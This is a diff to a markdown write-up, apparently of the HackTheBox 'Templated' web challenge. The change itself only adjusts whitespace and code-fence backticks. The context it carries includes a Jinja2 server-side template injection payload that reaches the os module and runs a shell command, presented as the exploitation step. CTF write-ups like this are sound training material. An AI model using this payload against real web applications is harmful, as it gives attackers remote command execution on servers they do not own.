@@ -1,4 +1,3 @@
-
 ---
 title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/209340214-c49c6c63-9e67-4c8c-8165-54e8db4dd0bd.png"> Templated  | HackTheBox | web challenge
 date: 2022-10-21 00:00:02 +730
@@ -36,9 +35,9 @@ Based on the user’s URL, the website will directly copy the content and print 
 
 ## Time to Exploit!
 
-````
+```
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-````
+```
 
 The result shows that we can access the os library and execute the **id** command.
 
